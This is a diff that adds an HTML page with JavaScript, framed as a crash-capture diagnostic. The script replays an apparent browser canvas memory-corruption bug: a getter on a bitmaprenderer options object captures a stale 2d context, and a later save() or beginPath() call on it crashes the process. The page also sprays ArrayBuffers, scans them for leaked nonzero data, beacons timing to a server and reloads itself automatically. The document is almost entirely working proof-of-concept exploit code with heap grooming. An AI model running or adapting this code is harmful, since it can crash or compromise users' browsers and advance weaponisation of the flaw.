@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<title>V973 - VC-04 diagnostic capture (frozen V923H-SAVE / V923C-BP replay)</title>
+<style>
+  body { background:#0b0e14; color:#d7e0ea; font-family:ui-monospace,Menlo,monospace; padding:14px; }
+  h1 { color:#58a6ff; font-size:15px; margin:0 0 6px; }
+  p  { color:#8b949e; font-size:12px; margin:4px 0 10px; line-height:1.55; }
+  pre { font-size:12px; white-space:pre-wrap; }
+  code { color:#c9d1d9; background:#21262d; padding:1px 5px; border-radius:4px; }
+  .key { border-left:3px solid #d29922; padding-left:8px; }
+</style>
+</head>
+<body>
+<h1>V973 - VC-04 diagnostic capture: frozen V923H-SAVE (save200) / V923C-BP (nospray) replay, tight crash window</h1>
+
+<p class="key">
+<b>Purpose (diagnostic only).</b> Replays the two inferred-crash configurations <b>one deterministic call per load</b>,
+with beacons bracketing the fatal call to a sub-second window so a kernel-log/crash capture (VC-04 option B) can be
+correlated by time and order. <b>No AB scanning by default</b> (excludes the V923H post-save scan as the crash site),
+no roundRect, no address math. Modes: <code>?mode=save</code> (default = V923H save200: minimal V569 trigger + 200&times;
+zeroed <code>ArrayBuffer(768)</code> + <code>save()</code>, 2/2 crash) and <code>?mode=bp</code> (= V923C bp-nospray:
+32-save trigger + no spray + <code>beginPath()</code>, 2/2 crash). <code>&arm=0</code> = control (skip the fatal call;
+klog baseline). <code>&scan=1</code> = replicate V923H's post-save canary scan exactly. <code>&stop=1</code> =
+do not auto-reload. <b>Collect klog immediately after 2 crashes: <code>python tools/vc04_encode.py capture</code></b>.
+</p>
+
+<pre id="out">starting...</pre>
+
+<script>
+'use strict';
+
+var SEEK = location.pathname;
+var RUN = 'r' + Date.now().toString(36) + '-' + Math.random().toString(36).slice(2, 7);
+var MODE = (location.search.indexOf('mode=bp') >= 0) ? 'bp' : 'save';
+var ARM = location.search.indexOf('arm=0') < 0;      /* arm=0 -> control, skip fatal call */
+var SCAN = location.search.indexOf('scan=1') >= 0;   /* scan=1 -> replicate V923H post-save scanAll */
+var STOP = location.search.indexOf('stop=1') >= 0;   /* stop=1 -> no auto reload */
+var MAXLOADS = 6;
+
+function lsGet(k) { try { return window.localStorage.getItem('v973_' + k); } catch (e) { return null; } }
+function lsSet(k, v) { try { window.localStorage.setItem('v973_' + k, String(v)); } catch (e) {} }
+function lsDel(k) { try { window.localStorage.removeItem('v973_' + k); } catch (e) {} }
+
+/* Sync XHR beacons so every marker flushes before the process can die. */
+function bks(tag, body) {
+  var u = '/beacon/V973-' + tag + '?d=' +
+          encodeURIComponent(String(body == null ? '' : body).slice(0, 460)) +
+          '&run=' + encodeURIComponent(RUN) + '&t=' + Date.now() + '&s=1';
+  try { var x = new XMLHttpRequest(); x.open('GET', u, false); x.send(null); }
+  catch (e) { try { var i = new Image(); i.src = u; } catch (e2) {} }
+}
+
+var O = document.getElementById('out');
+function say(s) { O.textContent += '\n' + s; }
+function errOf(e) { return e ? String(e.name || 'Error') + ':' + String(e.message || '').slice(0, 80) : 'none'; }
+function reloadSoon(ms) { if (STOP) { bks('STOPPED', 'no reload (stop=1)'); return; } setTimeout(function () { location.href = SEEK + '?op=auto&mode=' + MODE + (ARM ? '' : '&arm=0') + (SCAN ? '&scan=1' : '') + '&r=' + Date.now(); }, ms); }
+
+var CTX = null;
+var P = null; /* saved 2d ctx from inside the getter (the stale ref) */
+
+/* ---- frozen triggers (lineage-exact) ---------------------------------- */
+
+/* V569-minimal trigger (V923H lineage): no property sets, no saves in getter */
+function triggerMinimal(canvas) {
+  var saved = null, hasRR = false;
+  var dict = {};
+  Object.defineProperty(dict, 'alpha', {
+    get: function () {
+      var ctx = canvas.getContext('2d');
+      if (!ctx) return true;
+      saved = ctx;
+      try { hasRR = (typeof ctx.roundRect === 'function'); } catch (e0) {}
+      return true;
+    }
+  });
+  var bmp = null;
+  try { bmp = canvas.getContext('bitmaprenderer', dict); } catch (e2) {}
+  return { saved: saved, bmp: bmp, hasRR: hasRR };
+}
+
+/* 32-save trigger (V923C lineage): property sets + 32 saves inside getter */
+function triggerSave32(canvas) {
+  var saved = null, hasRR = false;
+  var dict = {};
+  Object.defineProperty(dict, 'alpha', {
+    get: function () {
+      var ctx = canvas.getContext('2d');
+      if (!ctx) return true;
+      saved = ctx;
+      try { hasRR = (typeof ctx.roundRect === 'function'); } catch (e0) {}
+      try {
+        ctx.lineWidth = 3.14159;
+        ctx.miterLimit = 7.77;
+        ctx.globalAlpha = 0.42;
+        ctx.lineDashOffset = 2.222;
+        ctx.shadowBlur = 5.55;
+        for (var s = 0; s < 32; s++) ctx.save();
+        ctx.lineWidth = 1.0;
+      } catch (e) {}
+      return true;
+    }
+  });
+  var bmp = null;
+  try { bmp = canvas.getContext('bitmaprenderer', dict); } catch (e2) {}
+  return { saved: saved, bmp: bmp, hasRR: hasRR };
+}
+
+/* ---- zeroed ArrayBuffer spray (V923H save200: 200 x AB(768)) ---------- */
+var KEEP = null;
+function spray(count) {
+  if (count <= 0) { KEEP = null; return 0; }
+  var abs = new Array(count);
+  var t0 = performance.now();
+  for (var i = 0; i < count; i++) abs[i] = new ArrayBuffer(768);
+  var ms = Math.round(performance.now() - t0);
+  KEEP = abs;
+  return ms;
+}
+
+function triesOf() { var t = parseInt(lsGet('tries') || '0', 10); return isNaN(t) ? 0 : t; }
+function bumpTry() { var t = triesOf() + 1; lsSet('tries', t); return t; }
+
+/* ---- main -------------------------------------------------------------- */
+
+function main() {
+  var q = location.search;
+  if (q.indexOf('reset=1') >= 0) {
+    lsDel('pending'); lsDel('loads'); lsDel('tries'); lsDel('phase');
+    bks('RESET', 'cleared,mode=' + MODE);
+    say('cleared (mode=' + MODE + '). reopening in 1.5s...');
+    setTimeout(function () {
+      location.href = SEEK + '?op=auto&mode=' + MODE + (ARM ? '' : '&arm=0') + (SCAN ? '&scan=1' : '') + '&r=' + Date.now();
+    }, 1500);
+    return;
+  }
+
+  var loads = parseInt(lsGet('loads') || '0', 10) + 1;
+  lsSet('loads', loads);
+  if (loads > MAXLOADS) {
+    lsSet('phase', 'done');
+    bks('GIVEUP', 'loads=' + loads + ',mode=' + MODE);
+    say('give up (phase=done) - reset with ?reset=1 to run again');
+    return;
+  }
+
+  /* Reload-detect: a pending marker surviving to the next load means the
+     process died while it was set (crash, reload, OOM-kill...). */
+  var pend = lsGet('pending');
+  if (pend) {
+    lsDel('pending'); var t = triesOf();
+    bks('CRASH', 'pending=' + pend + ',try=' + t + ',load=' + loads + ',mode=' + MODE + (ARM ? '' : ',ARM=0') + (SCAN ? ',scan=1' : ''));
+    say('CRASH pending=' + pend);
+    /* paced: 2 crashes are enough for (B); 4s delay avoids system reload dialogs */
+    reloadSoon(4000); return;
+  }
+  if (lsGet('phase') === 'done') { say('done. reset with ?reset=1'); bks('ALREADY', 'done'); return; }
+
+  var tryN = bumpTry();
+  bks('ENV', 'mode=' + MODE + ',arm=' + (ARM ? 1 : 0) + ',scan=' + (SCAN ? 1 : 0) +
+      ',try=' + tryN + ',load=' + loads + ',devMs=' + Date.now() +
+      ',ua=' + navigator.userAgent.slice(0, 90));
+  bks('BOOT', 'load=' + loads + ',try=' + tryN + ',mode=' + MODE);
+
+  var canvas = document.createElement('canvas'); canvas.width = 1; canvas.height = 1;
+  document.body.appendChild(canvas); window._v973canvas = canvas;
+
+  var tr = (MODE === 'bp') ? triggerSave32(canvas) : triggerMinimal(canvas);
+  if (!tr.saved) { bks('ERR', 'trigger-failed,mode=' + MODE); reloadSoon(4000); return; }
+  CTX = tr.saved;
+  bks('TRIGGERED', 'mode=' + MODE + ',rr=' + tr.hasRR + ',tMs=' + Math.round(performance.now()));
+
+  var abs = (MODE === 'save') ? 200 : 0;
+  var sprayMs = spray(abs);
+  bks('ARM', 'mode=' + MODE + ',abs=' + abs + ',sprayMs=' + sprayMs);
+
+  if (!ARM) { bks('CONTROL', 'arm=0,skip fatal call (klog baseline run)'); say('control run (arm=0): no fatal call'); reloadSoon(4000); return; }
+
+  /* ---- the single fatal call, tightly bracketed ----------------------- */
+  var call = (MODE === 'bp') ? 'beginPath' : 'save';
+  lsSet('pending', MODE + ':' + call + ':try=' + tryN + ':devMs=' + Date.now());
+  bks('PRE', 'mode=' + MODE + ',try=' + tryN + ',call=' + call + ',devMs=' + Date.now());
+  say(call + '...');
+  var err = null;
+  try { if (call === 'save') CTX.save(); else CTX.beginPath(); } catch (e) { err = e; }
+  if (err) { lsDel('pending'); bks('CALLERR', 'mode=' + MODE + ',' + errOf(err)); reloadSoon(4000); return; }
+  bks('POST', 'mode=' + MODE + ',call returned,devMs=' + Date.now());
+
+  if (SCAN && call === 'save') {
+    /* exact V923H post-save behavior: 200 x 192 word scan for any nonzero */
+    var hits = 0;
+    for (var i = 0; i < 200 && KEEP && i < KEEP.length; i++) {
+      var v = new Uint32Array(KEEP[i]);
+      for (var w = 0; w < 192; w++) { if (v[w] !== 0) { hits++; break; } }
+    }
+    bks('SCAN', 'mode=save,nonzeroABs=' + hits + ',devMs=' + Date.now());
+  }
+
+  lsDel('pending');
+  bks('CLEAR', 'mode=' + MODE + ',pending cleared,devMs=' + Date.now());
+
+  /* survival proof: alive at +1s and +3s bounds the crash window from the right */
+  setTimeout(function () { bks('ALIVE1', 'mode=' + MODE + ',+1s,devMs=' + Date.now()); say('alive +1s'); }, 1000);
+  setTimeout(function () {
+    bks('ALIVE3', 'mode=' + MODE + ',+3s,devMs=' + Date.now());
+    bks('DONE', 'mode=' + MODE + ',try=' + tryN + ' survived - retrying');
+    say('alive +3s -> retry');
+    reloadSoon(1500);
+  }, 3000);
+}
+
+try { main(); } catch (e) { bks('FATAL', String(e && (e.message || e)).slice(0, 200)); say('FATAL ' + e); }
+</script>
+</body>
+</html>
